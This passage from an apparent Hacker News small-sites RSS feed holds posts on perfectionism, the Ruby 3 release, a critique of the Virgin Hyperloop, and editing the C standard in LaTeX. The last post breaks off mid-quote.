<p><img data-attachment-id="2369" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/happyenough/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=1200%2C702&amp;ssl=1" data-orig-size="1200,702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="HappyEnough" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=630%2C369&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;ssl=1" alt="HappyEnough" width="630" height="369" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>When I think about clicking ‘send’ or ‘post’ before I’ve checked for typos, before I’ve reread everything, before considering where it might be wrong or unclear… it just feels, well, WRONG. I’m not yet happy with it and have trouble declaring it done.</p>
<p>Apart from requiring more time and effort, this can make even seemingly trivial tasks feel daunting. Internally, if you know that a short email will take an hour and a half it’s going to loom large even if you have trouble explaining quite why such a small thing is making you feel overwhelmed.</p>
<hr>
<p><strong>What’s helped me:</strong> A likely culprit is overestimating the consequences of mistakes. One solution is to be concrete and write down what you expect to happen if it turns out you have a typo, miss a shot, or bomb a test. Sometimes all it takes to readjust is examining those expectations consciously. Other times you’ll need to experience the ‘failure’, at which point you can compare it to your stated expectations.</p>
<hr>
<h3>Why perfectionists give up on hobbies and tasks easily</h3>
<p>Another way to look at this is: if you don’t expect to reach high standards, a project just doesn’t seem worth doing.</p>
<p><img data-attachment-id="2368" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/adequateresults/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=1266%2C744&amp;ssl=1" data-orig-size="1266,744" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="AdequateResults" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=630%2C370&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;ssl=1" alt="AdequateResults" width="630" height="370" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The result is a kind of min-max of approach to life: If you can’t excel, don’t bother spending time on it.</p>
<p>That’s not necessarily a bad thing!</p>
<p>However, we don’t always have control. In my nonprofit communications career, I sometimes got assigned to write press releases on topics that *might* get attention, but which seemed not newsworthy to me. It may have still been worth the few hours of my time in case it grabbed a reporter’s eye. It was important to keep my job. But I had so. much. trouble. getting myself to do the work.</p>
<p>Even in the personal realm, picking up a new hobby is made difficult. If it doesn’t seem like you’re going to be amazing at it, the hobby as a whole loses its luster.</p>
<hr>
<p><strong>What’s helped me: </strong>A big problem for me has been overlooking the benefits gained from so-called “failure”. Once I start to factor in e.g. how much I expect to learn (so that I can do better in the future) I end up feeling much better about giving things a shot.</p>
<hr>
<h3>Why procrastination (and anxiety) are common</h3>
<p>At a granular scale, the problem becomes worse. Rather than “How good do I expect to feel at the end of this?” our emotional reaction is probably trained by the in-the-moment “How much happier do I expect to feel as a result of one more bit of work?”</p>
<p>In other words, we can view the derivative/slope of these graphs as motivation:</p>
<p><img data-attachment-id="2367" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/motivationcurves/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=1198%2C608&amp;ssl=1" data-orig-size="1198,608" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="MotivationCurves" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=630%2C320&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;ssl=1" alt="MotivationCurves" width="630" height="320" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>With a perfectionist mindset, the bigger and further away a goal is, the more difficult it will be to feel motivated in the moment.&nbsp; For much of the time, we’re trying to push ourselves to work without getting any internal positive reinforcement.</p>
<p>This is a particular issue in the Effective Altruism movement where the goal is to *checks notes* Save the World. Also, to (“Figure out how to do the most good, and then do it.”)</p>
<p>It’s true that as a perfectionist nears their goal, they’re extremely motivated! But that also means that the stakes are very high for every decision and every action.&nbsp; …Which is a recipe for anxiety. Terrific.</p>
<hr>
<p><strong>What’s helped me: </strong>To the extent that I can, I find that breaking tasks into pieces helps. If I think of my goal as “Save the World”, another day of work won’t feel very important. But a goal of “Finish reading another research paper” is something I can make real progress on in a day!</p>
<hr>
<h2>All models are wrong, but some are useful</h2>
<p>This framework isn’t perfect. Neither is this writeup. (I’m hyper-aware.) But this idea has been in my head, in my drafts folder, and unfinished for months. Rather than give in to the sense that I “should” keep working on it, I’m going to try following my own advice. I’m remembering that:</p>
<ul>
<li>I’ve clarified my thinking a ton by writing everything down.</li>
<li>The consequences of a sloppy post in are minimal in the big scheme of things.</li>
<li>This isn’t supposed to be my final conclusion – it’s one step on the path</li>
</ul>
<p>Even if it’s not perfect, perhaps the current iteration of this framework can help you understand me, yourself, or perfectionists in your life.</p>
<p>I used to have this “DONE IS BETTER THAN PERFECT” poster draped over a chair in my office. I never got around to hanging it up, but honestly? It seems better that way.</p>
<p><img data-attachment-id="2366" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/poster/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=720%2C1276&amp;ssl=1" data-orig-size="720,1276" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Poster" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=169%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=578%2C1024&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;ssl=1" alt="Poster" width="250" height="443" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<h2>Articles/books I found helpful:</h2>
<p><a title="The-Perfectionist-Script-for-self-defeat" href="https://jessegalef.com/wp-content/uploads/2020/08/the-perfectionist-script-for-self-defeat.pdf">The-Perfectionist-Script-for-self-defeat</a> by David Burns (pdf)</p>
<p><a href="https://www.amazon.com/dp/B005ZE5AT2/" target="_blank" rel="noopener">When Perfect Isn’t Good Enough</a> by&nbsp;<span><span>Martin M. Antony&nbsp;&amp;</span><span><span>&nbsp;</span></span></span><span>Richard P. Swinson</span></p>
<p><a href="https://www.amazon.com/dp/B06XCY97JT/" target="_blank" rel="noopener">Mastering the Art of Quitting</a> by Peg Streep &amp; Alan Bernstein</p>
<p><a href="https://www.amazon.com/dp/B00475ARKC/" target="_blank" rel="noopener">Better By Mistake</a> by Alina Tugend</p>
<p><a href="https://www.amazon.com/dp/B003ZSHUP2/" target="_blank" rel="noopener">The Procrastination Equation</a> by Piers Steel</p>

					
					<!--
					<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:identifier="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:title="A Pretty-Good Mathematical Model of Perfectionism"
    trackback:ping="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/trackback/" />
</rdf:RDF>					-->

				</div></div>]]>
            </description>
            <link>https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088396</guid>
            <pubDate>Fri, 13 Nov 2020 22:37:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Release of Ruby 3 Will Be Monumental]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25088015">thread link</a>) | @tomashertus
<br/>
November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>
</div></div>]]>
            </description>
            <link>https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088015</guid>
            <pubDate>Fri, 13 Nov 2020 21:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hyperloop’s Only Destination Is a Capitalist Hellscape]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 79 (<a href="https://news.ycombinator.com/item?id=25087782">thread link</a>) | @xdze2
<br/>
November 13, 2020 | https://discourseblog.com/hyperloop-test-virgin-scam/ | <a href="https://web.archive.org/web/*/https://discourseblog.com/hyperloop-test-virgin-scam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Back in 2016 and 2017, one of the key components of mainstream tech coverage was something referred to as “vaporware“1: flashy, futuristic tech whose supposed potential often overshadowed its practicality or even, you know, actual existence in the real world. </p>



<p>This was a strange time in technology and tech journalism, one <a href="https://discourseblog.com/elon-musk-made-me-a-socialist/">I’ve written about at length before</a>. Uber did a whole <a href="https://www.theverge.com/2017/11/8/16613228/uber-flying-car-la-nasa-space-act">summit on how it was going to build flying cars,</a> self-driving technology was assumed to be right around the corner, and editors commissioned endless stories about <a href="https://www.mercurynews.com/2016/07/09/hacking-the-brain-silicon-valley-entrepreneurs-turn-to-fasting-and-smart-drugs/">“biohacking”</a> and <a href="https://www.bbc.com/news/technology-34210012">“transhumanism.”</a> One of the most interesting, most hyped, and most wildly impractical technologies from this era was the hyperloop. </p>



<p>I’m not going to go into huge detail on the hyperloop’s origin story, other than to say it owes its current popularity to the incredibly stupid personality cult surrounding Elon Musk. The technology is relatively easy to understand: you put a vehicle on a track inside a vacuum-sealed tube and it goes very fast. </p>



<p>The hilariously named Virgin Hyperloop2 passed a huge milestone this week when its first two passengers went down its 500-meter tube at a little over 100mph.3 The company celebrated the achievement by releasing a modest video comparing it to, among other things, the moment the Wright Brothers flew the first planes.</p>



<figure></figure>



<p>The core difference of the “hyperloop” versus, say, a train, is that the passenger-carrying vehicle inside the vacuum tube is not susceptible to air resistance, and can therefore attain speeds that are largely impossible or unsafe for an external train. However, as you can imagine, the logistics of building a perfectly vacuum-sealed tube big enough to carry a magnetic levitation vehicle are significantly more difficult than, say, building a train track (even a magnetic levitation one). </p>



<p>And as <a href="https://twitter.com/leftistthot420/status/1326559165838487552?s=20">many</a> <a href="https://twitter.com/hilaryagro/status/1326531535223345153?s=20">people</a> <a href="https://twitter.com/jkass99/status/1326607439240679424?s=20">pointed out</a> online, focusing on this kind of technology rather than, say, <em>trains</em>, is insanely stupid because we already have trains that are way better than this. We—by which I mean America— just don’t want to spend the money to build them. </p>



<figure></figure>



<p>Hyperloop is, in this context, the perfect example of the end-state death-cult capitalism that the American ruling class believes in. Virgin Hyperloop has raised some $400 million so far according to the <a href="https://www.nytimes.com/2020/11/08/business/virgin-hyperloop-passenger-test.html"><em>New York Times</em> story on the test</a>, which is half just a press release and then two interviews with experts saying “this shit won’t work, why are they doing this.” $400 million is a drop in the bucket compared to what it would cost to build an actual functioning high-speed rail network across the country.4</p>



<p>What hyperloop <em>does</em> do, however, is let the powers that be point to flashy efforts to make a cool technology real, like when Trump’s Transportation Secretary Elaine Chao5 <a href="https://www.mhlnews.com/transportation-distribution/article/22055573/dot-wants-to-weigh-in-on-emerging-transportation-technology">created</a> the Non-Traditional and Emerging Transportation Technology (NETT) Council to basically remove any federal regulation that would stop people flooding money into this shit.</p>



<p>Despite how all this sounds, I’m ultimately not a pessimist on the hyperloop as a whole. I think that worldwide mass transit is eventually going to need some kind of system that replaces air travel, which is extraordinarily energy-inefficient and currently relies entirely on fossil fuels to make it work. Ground transportation is largely restricted in speed by friction and air resistance, two things that a vacuum-sealed hyperloop system removes.6 I think eventually, a global network of 500 mph + transport technology might be feasible, but this is like 2200 tech we’re talking about, not 2020. Until then, we have trains. Trains that work, trains that can work even better, trains that are <em>incredibly efficient at moving goods, services, and people long distances and are relatively easy to power with non-fossil-fuel sources because they’re on static tracks. </em>Trains are good! </p>



<p>But this is America, and we cannot have nice things. Creating a nationwide high-speed rail service would cost money and political capital, and doing it right would require it to be a largely publicly-funded and administered project. Hyperloop, however, is marketing itself to the highest bidder: there’s a reason that the first contracts its various scammy companies sold were to do things like <a href="https://www.bbc.com/news/technology-49096675">connecting Riyadh to Jeddah in Saudi Arabia</a>.  </p>



<p>The core deceit of all of these technologies, from hyperloop to flying cars to neural nets, is that they will demonstrably improve everyday people’s lives at some point in their lifetimes. What the founders do is say “this is coming in 2020,” in 2016, and by 2020 they’re a bit behind schedule, but look, they have a flashy test to show you. The technology is coming soon, they promise. And when it gets here, when they “make it a reality,” to paraphrase almost every article written about vaporware, your life will get better. Only the tech never comes. And when it does, you won’t be able to afford it. It’s entirely possible that in our lifetimes the oil and gas billionaires in Saudi Arabia will be able to shoot themselves in tiny designer-branded pods with heated leather seats from one side of the Kingdom to the other. Maybe we’ll even have a line in the U.S. that Wall Street execs and DC lobbyists will use to blast up and down the Eastern Seaboard for business lunches. But you and me? We’ll be stuck on dilapidated Amtrak lines, no matter how many press tours Joe Biden takes on them, eating Cup Noodles from the dining car, or else stuck in our cars, choking the sky with emissions from the gas that we can barely afford to buy, stuck in traffic on roads falling further and further into disrepair, our only consolation the fact that the hyperloop’s vacuum-sealed tubes don’t have windows, so its riders won’t be able to gawk or gloat as they fly by at 800 miles per hour. </p>



<hr>



<ol><li><em>For an absolutely excellent breakdown of what vaporware and tech like it is, watch <a href="https://www.youtube.com/watch?v=4dn6ZVpJLxs">engineering YouTuber donoteat01’s video on a related idea</a>, Elon Musk’s “Loop” system. He uses the term “Fucking Magic,” rather than vaporware, which is more fun to say honestly. </em></li><li><em>As an aside, Virgin Hyperloop is the like fifth corporate incarnation of a company called Hyperloop One that was founded by a bunch of tech dorks including a man named, I shit you not, Brogan BamBrogan, who later left the company to start his own hyperloop company because his co-founders allegedly put an alleged noose on his desk during some kind of internal conflict that I refuse to re-familiarize myself with but that you can read about here in a <a href="https://www.inverse.com/article/18194-the-8-wildest-takeaways-from-bambrogan-s-hyperloop-one-lawsuit">listicle that I edited in 2016</a>.</em></li><li><em>Guess they can’t call it a virgin anymore ha ha ha ha. </em></li><li><em>Probably in the hundreds of billions if not trillions I honestly have no idea but it’s not cheap. Seth Moulton put forth <a href="https://www.globalrailwayreview.com/news/100907/plans-investment-us-high-speed-rail/">a $240 billion plan</a> a few years ago but I think that’s a little low. </em></li><li><em>Chao is also Mitch McConnell’s wife. </em></li><li><em>People actually figured this out in the 1800s when they used <a href="https://www.newstatesman.com/future-proof/2013/12/londons-victorian-hyperloop-forgotten-pneumatic-railway-beneath-capitals-street">pneumatic tubes to shoot mail and cargo all over London.</a> </em></li></ol>
</div></div></div></div></div>]]>
            </description>
            <link>https://discourseblog.com/hyperloop-test-virgin-scam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25087782</guid>
            <pubDate>Fri, 13 Nov 2020 21:35:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Editing the C Standard]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25086673">thread link</a>) | @trollied
<br/>
November 13, 2020 | https://thephd.github.io/editing-the-c-standard | <a href="https://web.archive.org/web/*/https://thephd.github.io/editing-the-c-standard">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
      <p>… I did it. I survived the Paper Blitz.<!--more--></p>



<p>For those of you who saw one of my earlier posts about <a href="https://thephd.github.io/your-c-compiler-and-standard-library-will-not-help-you">why most C implementations will purposefully blow your leg off even in the simplest of scenarios</a>, you may have noticed that I said I became the Project Editor for C. That’s a fancy way of saying I glue the standard together and produce both the Working Drafts/Working Papers (WDs/WPs), an Editor’s Report, and a Diffmark of the WD against the last published WD.</p>

<p>The <a href="https://drive.google.com/file/d/1IbngZ8StYVVYASd3WWuC4Uu9Xs39AF_N/view?usp=sharing">Working Draft is here</a> and the <a href="https://drive.google.com/file/d/1x4-eIBbQU3aXuORoNPSixbbl_ZKKfWfu/view?usp=sharing">Diffmarks are here</a> until I can publish it O f f i c i a l l y through the ISO® N-Paper™ System©.</p>

<p>Silly symbols aside, this was a slog through 30+ papers, a few defect reports, several editorial issues, and a minor cleanup of some of the sources. There was a backlog of about 3 meetings worth of papers to integrate, give or take a few from a few missed integrations in the past and a few things early-integrated from the meetings I had to cover. Despite some pretty crazy shenanigans when I was first handling becoming the Project Editor, everything ended up turning out smoothly! For the most part, anyways: I can already smell the editorial reports for all the things I probably messed up integrating. But what is it like, editing a Standards Document? What’s it like taking all those documents and turning them into a Working Draft?</p>

<p><img src="https://thephd.github.io/assets/img/2020-09-11/papers.png" alt="Image of a few of the papers from "></p>



<p>As with any project, it needs tools. This standard is built with a suite of tools any *Nix programmer will find comforting:</p>

<ul>
  <li><code>make</code>, for general build purposes</li>
  <li><code>sed</code> and <code>awk</code> for some reserved identifier / keyword shenanigans</li>
  <li><code>latex</code>, with the usual <code>pdflatex</code> and other shenanigans</li>
  <li><code>git</code>, to pull a previously tagged version of the standard to attempt to create useful diffmarks</li>
</ul>

<p>There’s also a bunch of other side tools used to generate some docs and other things, but that’s the core of it! As usual, nothing that discusses LaTeX would be complete without me saying the following…</p>

<h3 id="latex-is-horseshit">LaTeX is horseshit</h3>

<p>Boooiiiiiiiiiiii, do I hate LaTeX. The available LaTeX distributions are piss-tier garbage, printing a line number but not tracking any file information which makes any stream of multi-compilation completely useless and requiring separate invocations of the latex compiler for each file and magic to know which file you’re in. Not that that is how most people organize documents: <code>\input{the_file}</code> is the choice of developing a modular document in LaTeX land, complete with <code>#include</code>-like behavior but with 0% of the compiler Quality of Implementation.</p>

<p>Changing one thing of course results in a cascade of errors, warnings are split over multiple lines so as to make most error-parsing and warning-parsing regexen useless for trying to pick errors out of the literal 1 MB dump of errors, and trying to edit anything beyond the most basic of syntax is a complete slog. There is no reasonability, particular form, or dependable structure to LaTeX errors, other than “hard errors” starting with <code>!</code>.</p>

<p>Whitespace is not significant in the language (except when it is), people slap ad-hoc commands together to patch over LaTeX’s gross inefficiencies, adding that footnote catapults the next 3 paragraphs of text to write into the margins to the right, and have you heard of our Lord and Savior <code>OVERFULL HBOX</code>?</p>

<p>My eternal advice to everyone is to stop writing documents in LaTeX, please. You’d get farther and faster in even Microsoft Word, and it would render better for the internet. It has math support and it doesn’t poo all over the bed and scream when you want to try to add a mild margin to your author and title names, gargling with cryptic hints as to what will satisfy it enough to stop besmearing the nice linens in its dreadful output.</p>

<p>If your hands shake at the thought of not using BEAUTIFUL, LAYOUT-POWERFUL, HAND-BAKED LATEX on your résumé, there’s templates that make your Word Documents look like LaTeX ones. Just using a different Serif-y font will probably go a long way towards that look!</p>

<p>… That being said, the C Standard is written in LaTeX, so that’s what we’re editing.</p>

<h3 id="the-c-standard-is-mostly-nice">The C Standard is Mostly Nice</h3>

<p>Don’t get me wrong: LaTeX is garbage, but the Standard I was handed is of pretty good quality for a LaTeX document. It was easy to build and edit, I did not get lost once I had all the proper things installed (I did not decide to try to figure out the “minimum required distribution” and instead just shotgun <code>apt get install</code>d <code>texlive-full</code>), and the files were orderly. Referencing things is kind of terrible but that’s more of a LaTeX problem than a structure problem. I am also lucky to even be getting a LaTeX document: the standard used to be written in some God Awful Rotten Badness by the name of “TROFF”. I don’t know too much about it, and from the little that I did learn</p>

<p>I plan to keep it that way. 😄</p>

<p>There’s also the use of <code>latexdiff</code> and other things to produce nice diffmarks. It works out pretty decently, some of the marks are incredibly noisy. Still: as long as it highlights the general area of changes, it produces a pretty good proxy of “places to look for things that have changed”. It does ignore newly added files, which is why the lists at the beginning of the Working Paper – which detail the list of documents added from each meeting – are not all blue-highlighted. Having a nice LaTeX document with some really nice organization left to me by the last editor made the next part of this article the easiest…</p>



<p>Sweet, You Wrote a <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2335.pdf">Sick-Nasty Rad Paper</a> And Now It Needs To Be Put In The C Standard! So, how does it get there? Well, you don’t actually write a diff to the standard. At least, not a <em>real</em> diff: the sources to the C standard are hidden from the world to keep them safe, even when the time of Darkness descends upon us. What you write are <em>instructions to the project editor</em> (Hi, That’s Me!), and then I take your instructions and do my Best Effort™ to reflect them in the C Standard. Most of the wording gets approved by the Committee before-hand, and the edits are usually straightforward and simple. <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2517.pdf">For example</a>:</p>

<blockquote>
  <p>RECOMMENDATION: 3.4.3p4 should use a different example of undefined behavior, such as:</p>
